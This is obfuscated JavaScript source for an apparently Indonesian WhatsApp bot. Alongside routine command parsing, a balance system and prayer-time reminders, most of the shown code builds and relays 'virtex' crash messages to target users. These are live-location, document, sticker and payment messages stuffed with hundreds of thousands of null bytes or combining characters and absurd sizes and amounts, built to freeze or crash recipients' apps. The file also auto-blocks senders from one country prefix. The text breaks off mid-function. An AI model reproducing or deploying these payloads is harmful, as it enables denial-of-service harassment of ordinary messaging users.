module.exports = async (_0x463682, _0x3ac71a, _0x4714d9) => {
  try {
    const _0x17a7f6 = _0x3ac71a.key.remoteJid;
    const _0x467f6d = _0x3ac71a.quoted ? _0x3ac71a.quoted : _0x3ac71a;
    var _0x2091c6 = _0x3ac71a.mtype === "interactiveResponseMessage" ? JSON.parse(_0x3ac71a.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x3ac71a.mtype === "conversation" ? _0x3ac71a.message.conversation : _0x3ac71a.mtype == "imageMessage" ? _0x3ac71a.message.imageMessage.caption : _0x3ac71a.mtype == "videoMessage" ? _0x3ac71a.message.videoMessage.caption : _0x3ac71a.mtype == "extendedTextMessage" ? _0x3ac71a.message.extendedTextMessage.text : _0x3ac71a.mtype == "buttonsResponseMessage" ? _0x3ac71a.message.buttonsResponseMessage.selectedButtonId : _0x3ac71a.mtype == "listResponseMessage" ? _0x3ac71a.message.listResponseMessage.singleSelectReply.selectedRowId : _0x3ac71a.mtype == "templateButtonReplyMessage" ? _0x3ac71a.message.templateButtonReplyMessage.selectedId : _0x3ac71a.mtype == "messageContextInfo" ? _0x3ac71a.message.buttonsResponseMessage?.selectedButtonId || _0x3ac71a.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x3ac71a.text : "";
    const _0x53d892 = typeof _0x3ac71a.text == "string" ? _0x3ac71a.text : "";
    const _0x2064f9 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x2091c6) ? _0x2091c6.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const _0x57bb16 = _0x2091c6.startsWith(_0x2064f9);
    const _0xf77d4c = _0x2091c6.replace(_0x2064f9, "").trim().split(/ +/).shift().toLowerCase();
    const _0x490112 = _0x2091c6.trim().split(/ +/).slice(1);
    const _0x35d65a = (_0x467f6d.msg || _0x467f6d).mimetype || "";
    const _0x2d7ff5 = q = _0x490112.join(" ");
    const _0x3d7b7a = _0x17a7f6.endsWith("@g.us");
    const _0x281c89 = await _0x463682.decodeJid(_0x463682.user.id);
    const _0x36ecab = _0x3ac71a.key.fromMe ? _0x463682.user.id.split(":")[0] + "@s.whatsapp.net" || _0x463682.user.id : _0x3ac71a.key.participant || _0x3ac71a.key.remoteJid;
    const _0x47a507 = ["0@s.whatsapp.net"];
    const _0x409df4 = _0x36ecab.split("@")[0];
    const _0xcbde79 = _0x3ac71a.pushName || "" + _0x409df4;
    const _0x25815e = _0x281c89.includes(_0x409df4);
    const _0x3fe489 = _0x3d7b7a ? await _0x463682.groupMetadata(_0x3ac71a.chat).catch(_0x366d94 => {}) : "";
    const _0x3e4a30 = _0x3d7b7a ? _0x3fe489.subject : "";
    const _0x197555 = _0x3d7b7a ? await _0x3fe489.participants : "";
    const _0x5ef174 = _0x3d7b7a ? await _0x197555.filter(_0x1baa4a => _0x1baa4a.admin !== null).map(_0x34e926 => _0x34e926.id) : "";
    const _0x38e7f0 = _0x3d7b7a ? _0x3fe489.owner : "";
    const _0xb70752 = _0x3d7b7a ? _0x3fe489.participants : "";
    const _0x223faa = _0x3d7b7a ? _0x5ef174.includes(_0x281c89) : false;
    const _0xb6e2c1 = _0x3d7b7a ? _0x5ef174.includes(_0x281c89) : false;
    const _0x565469 = _0x3d7b7a ? _0x5ef174.includes(_0x36ecab) : false;
    const _0x24dd83 = () => {
      var _0x4b542c = fs.readFileSync("./deltatech").toString();
      var _0x279bee = (_0x4b542c.match(/case '/g) || []).length;
      return _0x279bee;
    };
    const _0x337639 = _0x3d7b7a ? _0x5ef174.includes(_0x36ecab) : false;
    const _0x5b0771 = moment.tz("Asia/Jakarta").format("DD/MM/YY");
    const {
      Client: _0x1d1f54
    } = require("ssh2");
    const _0x5d0b71 = require("javascript-obfuscator");
    const {
      addSaldo: _0x3c3bfa,
      minSaldo: _0x8e1b95,
      cekSaldo: _0x5175f6
    } = require("./database/dtbs/deposit");
    const {
      mediafireDl: _0x1d989f
    } = require("./database/dtbs/mediafire.js");
    let _0x2c3528 = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
    const {
      beta1: _0x47fcab,
      beta2: _0x5e8e91,
      buk1: _0x5e6b35
    } = require("./database/lib/hdr.js");
    const _0x26683b = fs.readFileSync("./database/image/bug.jpg");
    const _0x428a26 = fs.readFileSync("./database/delta.mp3");
    const _0x1343a0 = fs.readFileSync("./database/image/delta.jpg");
    const _0x37cb56 = fs.readFileSync("./database/image/zkosong.png");
    const _0x151e71 = "`[♨️]` 𝙋𝙧𝙤𝙘𝙘𝙚𝙨";
    const _0x3a2646 = "`[♨️]` *𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮*";
    const {
      ios: _0x53c1bd
    } = require("./database/virtex/ios.js");
    const {
      freeze: _0x360075
    } = require("./database/virtex/freeze.js");
    const {
      convite: _0xc0d562
    } = require("./database/virtex/convite.js");
    const {
      bugpdf: _0x3cb2e9
    } = require("./database/virtex/bugpdf.js");
    const {
      bugurl: _0x11e71e
    } = require("./database/virtex/bugUrl.js");
    const {
      talapreta3: _0x512df7
    } = require("./database/virtex/telapreta3.js");
    if (_0x3ac71a.sender.startsWith("212")) {
      return _0x463682.updateBlockStatus(_0x3ac71a.sender, "block");
    }
    const _0x59a2e9 = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
    const _0x595c09 = _0x59a2e9[Math.floor(Math.random() * _0x59a2e9.length)];
    let _0x51c2ce = runtime(process.uptime());
    if (_0x57bb16) {
      console.log(chalk.white.bgRed.bold("Ada Pesan Nih Development"), color("[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ ]", "green"), color("FROM", "red"), color("" + _0xcbde79, "red"), color("Text :", "yellow"), color("" + _0x2091c6, "blue"));
    }
    const _0x3f6777 = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const _0x340129 = moment.tz("Asia/Jakarta").format("HH : mm :ss");
    const _0x3b70e0 = moment.tz("Asia/Jayapura").format("HH : mm : ss");
    const _0x3be02c = moment.tz("Asia/Makassar").format("HH : mm : ss");
    const _0x2939d8 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (_0x2939d8 < "23:59:00") {
      var _0x5347e1 = "Selamat Malam 🏙️";
    }
    if (_0x2939d8 < "19:00:00") {
      var _0x5347e1 = "Selamat Petang 🌆";
    }
    if (_0x2939d8 < "18:00:00") {
      var _0x5347e1 = "Selamat Sore 🌇";
    }
    if (_0x2939d8 < "15:00:00") {
      var _0x5347e1 = "Selamat Siang 🌤️";
    }
    if (_0x2939d8 < "10:00:00") {
      var _0x5347e1 = "Selamat Pagi 🌄";
    }
    if (_0x2939d8 < "05:00:00") {
      var _0x5347e1 = "Selamat Subuh 🌆";
    }
    if (_0x2939d8 < "03:00:00") {
      var _0x5347e1 = "Selamat Tengah Malam 🌃";
    }
    _0x463682.autoshalat = _0x463682.autoshalat ? _0x463682.autoshalat : {};
    let _0xff245c = _0x3ac71a.chat;
    if (_0xff245c in _0x463682.autoshalat) {
      return false;
    }
    let _0x18fee9 = {
      shubuh: "04:29",
      terbit: "05:44",
      dhuha: "06:02",
      dzuhur: "12:02",
      ashar: "15:15",
      magrib: "17:52",
      isya: "19:01"
    };
    const _0x255407 = new Date(new Date().toLocaleString("en-US", {
      timeZone: "Asia/Jakarta"
    }));
    const _0x525281 = _0x255407.getHours();
    const _0x32e605 = _0x255407.getMinutes();
    const _0x9a7b1 = _0x525281.toString().padStart(2, "0") + ":" + _0x32e605.toString().padStart(2, "0");
    for (let [_0x44fc89, _0x3729da] of Object.entries(_0x18fee9)) {
      if (_0x9a7b1 === _0x3729da) {
        _0x463682.autoshalat[_0xff245c] = [_0x463682.sendMessage(_0x3ac71a.chat, {
          audio: {
            url: "https://media.vocaroo.com/mp3/1ofLT2YUJAjQ"
          },
          mimetype: "audio/mp4",
          ptt: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              mediaType: 1,
              mediaUrl: "",
              title: "Hai kak " + _0xcbde79 + ",\nWaktu *" + _0x44fc89 + "* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n_untuk wilayah Jawa barat dan sekitarnya._",
              body: "🕑 " + _0x3729da,
              sourceUrl: "",
              thumbnail: await fs.readFileSync("./database/image/jadwal.jpg"),
              renderLargerThumbnail: true
            }
          }
        }, {}), setTimeout(async () => {
          delete client.autoshalat[_0x3ac71a.chat];
        }, 57000)];
      }
    }
    const _0x377997 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: ""
      } : {})
    };
    const _0x27f901 = {
      isCanceled: false,
      name: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
      description: "Pe",
      location: {},
      joinLink: "https://whatsapp.com/channel/0029VatY2JHHltYEy0yenJ47",
      startTime: "1713724680"
    };
    _0x27f901.location.degreesLatitude = 0;
    _0x27f901.location.degreesLongitude = 0;
    _0x27f901.location.name = "Apakajajanabs";
    const _0x2d4386 = {
      eventMessage: _0x27f901
    };
    const _0x331c82 = {
      key: _0x377997,
      message: _0x2d4386
    };
    const _0x145005 = _0x331c82;
    const _0x41e1cf = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x1c6a84 = {
      key: _0x41e1cf,
      message: {
        requestPhoneNumberMessage: {
          contextinfo: 1
        }
      }
    };
    const _0x369ca4 = _0x1c6a84;
    const _0x1b1709 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: ""
      } : {})
    };
    const _0x370a97 = {
      key: _0x1b1709,
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 9999999999,
          ptt: "true"
        }
      }
    };
    const _0xbb317c = _0x370a97;
    const _0x64b965 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: ""
      } : {})
    };
    const _0x5bb6d5 = {
      key: _0x64b965,
      message: {
        pollCreationMessage: {
          name: "p"
        }
      }
    };
    const _0x2276c4 = _0x5bb6d5;
    const _0x1fee16 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x404316 = {
      key: _0x1fee16,
      message: {
        listResponseMessage: {
          title: "囧[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡囧"
        }
      }
    };
    const _0x5130e4 = _0x404316;
    const _0x25178d = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x58ecf4 = {
      selectedButtonId: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
      type: 1,
      response: {}
    };
    _0x58ecf4.response.selectedDisplayText = "penis";
    const _0x204339 = {
      buttonsResponseMessage: _0x58ecf4
    };
    const _0x31c770 = {
      key: _0x25178d,
      message: _0x204339
    };
    const _0x3f2c1b = _0x31c770;
    const _0x14d0d3 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x2cf632 = {
      key: _0x14d0d3,
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "120363297700623532@newsletter",
          newsletterName: "🐉",
          jpegThumbnail: ""
        }
      }
    };
    const _0x1ab57d = _0x2cf632;
    const _0x474dda = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x5853b7 = {
      currencyCodeIso4217: "USD",
      amount1000: 999,
      requestFrom: "0@s.whatsapp.net",
      noteMessage: {
        extendedTextMessage: {
          text: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡"
        }
      },
      expiryTimestamp: 999999999,
      amount: {}
    };
    _0x5853b7.amount.value = 91929291929;
    _0x5853b7.amount.offset = 1000;
    _0x5853b7.amount.currencyCode = "INR";
    const _0x69b35b = {
      requestPaymentMessage: _0x5853b7
    };
    const _0xe4f1a = {
      key: _0x474dda,
      message: _0x69b35b
    };
    const _0x1bcf3a = _0xe4f1a;
    const _0x5e3b58 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x579663 = {
      key: _0x5e3b58,
      message: {
        documentMessage: {
          title: "⃰⃰囧[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡囧"
        }
      }
    };
    const _0x3d9aed = _0x579663;
    const _0x55e57a = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x2c5831 = {
      key: _0x55e57a,
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 359996400,
          ptt: "true"
        }
      }
    };
    const _0xcd1c5b = _0x2c5831;
    const _0x35a24f = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x3ec04d = {
      key: _0x35a24f,
      message: {
        extendedTextMessage: {
          text: "⃰[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
          title: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡"
        }
      }
    };
    const _0x4692b6 = _0x3ec04d;
    const _0x227b6b = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x1aa66e = {
      key: _0x227b6b,
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg"
            },
            title: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
            description: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
            currencyCode: "IDR",
            priceAmount1000: "1000000000000000000",
            retailerId: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡",
            productImageCount: 1
          },
          businessOwnerJid: "0@s.whatsapp.net"
        }
      }
    };
    const _0x279dbe = _0x1aa66e;
    const _0x3463ba = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x104951 = {
      key: _0x3463ba,
      message: {
        videoMessage: {
          title: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ ",
          h: "Hmm",
          seconds: "359996400",
          gifPlayback: "true",
          caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ "
        }
      }
    };
    const _0x15f5ba = _0x104951;
    const _0x3d074a = {
      key: {
        participant: "0@s.whatsapp.net",
        remoteJid: "0@s.whatsapp.net"
      },
      message: {
        groupInviteMessage: {
          groupJid: "6289517977390-1616169743@g.us",
          inviteCode: "m",
          groupName: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ ",
          caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ "
        }
      }
    };
    const _0x5df0db = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x3d4e45 = {
      key: _0x5df0db,
      message: {
        videoMessage: {
          title: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ ",
          h: "Hmm",
          seconds: "359996400",
          caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ ",
          viewOnce: true
        }
      }
    };
    const _0x567bf0 = _0x3d4e45;
    const _0xbbccfd = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x3073e1 = {
      key: _0xbbccfd,
      message: {
        locationMessage: {
          name: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ "
        }
      }
    };
    const _0x2a12d2 = _0x3073e1;
    const _0x26cb36 = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x82d105 = {
      key: _0x26cb36,
      message: {
        liveLocationMessage: {
          title: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ ",
          h: "Hmm"
        }
      }
    };
    const _0x267462 = _0x82d105;
    const _0x59a8aa = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x3e040b = {
      key: _0x59a8aa,
      message: {
        contactMessage: {
          displayName: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ ",
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          sendEphemeral: true
        }
      }
    };
    const _0x31fae6 = _0x3e040b;
    async function _0x5aeef5(_0xc68455, _0x49ca21) {
      var _0xb6d9da = generateWAMessageFromContent(_0xc68455, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "mass",
              caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ 𝙏𝙍𝘼𝙎𝙃" + "\0".repeat(900000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0xc68455,
        quoted: _0x49ca21
      });
      await _0x463682.relayMessage(_0xc68455, _0xb6d9da.message, {
        participant: {
          jid: _0xc68455
        },
        messageId: _0xb6d9da.key.id
      });
    }
    async function _0x3770d1(_0x774c31, _0x2f348a) {
      var _0x74efc6 = generateWAMessageFromContent(_0x774c31, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "🔥፝⃟ ꙳ 𝐑𝐞𝐯𝐚𝐧𝐓𝐞𝐜𝐡 𝐕.𝟔.𝟎梨🐉🔥፝⃟" + "\0".repeat(900000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: _0x774c31,
        quoted: _0x2f348a
      });
      await _0x463682.relayMessage(_0x774c31, _0x74efc6.message, {
        participant: {
          jid: _0x774c31
        },
        messageId: _0x74efc6.key.id
      });
    }
    async function _0x46a00d(_0x2c0110, _0x5a385c) {
      var _0x1462c3 = generateWAMessageFromContent(_0x2c0110, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: _0x2c0110,
        quoted: _0x5a385c
      });
      await _0x463682.relayMessage(_0x2c0110, _0x1462c3.message, {
        participant: {
          jid: _0x2c0110
        },
        messageId: _0x1462c3.key.id
      });
    }
    async function _0x42e55b(_0x5de7c2, _0x42e5ea) {
      const _0x516967 = {
        upload: ryozingod.waUploadToServer
      };
      var _0x5cc401 = generateWAMessageFromContent(_0x5de7c2, proto.Message.fromObject({
        interactiveMessage: {
          header: {
            title: "囧[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡囧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({
              image: {
                url: "https://pomf2.lain.la/f/wrk6cuul.jpg"
              }
            }, _0x516967))
          },
          body: {
            text: ""
          },
          footer: {
            text: "› ©[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡"
          },
          nativeFlowMessage: {
            messageParamsJson: "\0".repeat(1000000)
          }
        }
      }), {
        userJid: _0x5de7c2,
        quoted: _0x42e5ea
      });
      await ryozingod.relayMessage(_0x5de7c2, _0x5cc401.message, {
        participant: {
          jid: _0x5de7c2
        },
        messageId: _0x5cc401.key.id
      });
    }
    const _0x3866bd = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x441320 = {
      key: _0x3866bd,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./database/image/bug.jpg")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x3bdd08 = {
      participant: "0@s.whatsapp.net",
      ...(_0x3ac71a.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x374b62 = {
      key: _0x3bdd08,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs.readFileSync("./database/image/bug.jpg")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    async function _0x29b9b2(_0x5f4b2e, _0x5a5901) {
      var _0x33fec6 = generateWAMessageFromContent(_0x5f4b2e, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "sv [⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡ 𝐕.𝟏𝟑.𝟎梨🐉",
              caption: "[⃟༑𝐃𝐄𝐋𝐓𝐀𝐍𝐄𝐖ཀ͜͡.xp" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x5f4b2e,
        quoted: _0x5a5901
      });
      await _0x463682.relayMessage(_0x5f4b2e, _0x33fec6.message, {
        participant: {
          jid: _0x5f4b2e
        },
        messageId: _0x33fec6.key.id
      });
    }
    async function _0x59112d(_0x4ca58a) {
      await _0x463682.relayMessage(_0x4ca58a, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {
        participant: {
          jid: _0x4ca58a
        }
      });
    }
    async function _0x26308e(_0x521c38, _0x43f754) {
      var _0x569890 = generateWAMessageFromContent(_0x521c38, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "𝐃𝐞𝐥𝐭𝐚 𝑪𝒓𝒂𝒔𝑿╳.xp" + "ྦྷ".repeat(60000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: _0x521c38,
        quoted: _0x43f754
      });
      await _0x463682.relayMessage(_0x521c38, _0x569890.message, {
        participant: {
          jid: _0x521c38
        },
        messageId: _0x569890.key.id
      });
    }
    async function _0x18807d(_0xb6e5fa, _0x54695d) {
      var _0x244d83 = generateWAMessageFromContent(_0xb6e5fa, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: _0xb6e5fa,
        quoted: _0x54695d
      });
      await _0x463682.relayMessage(_0xb6e5fa, _0x244d83.message, {
        participant: {
          jid: _0xb6e5fa
        },
        messageId: _0x244d83.key.id
      });
    }
    async function _0x35d883(_0x141f00, _0xbcb508) {
      const _0xa2169f = {
        upload: _0x463682.waUploadToServer
      };
      var _0x4f8c6b = generateWAMessageFromContent(_0x141f00, proto.Message.fromObject({
        interactiveMessage: {
          header: {
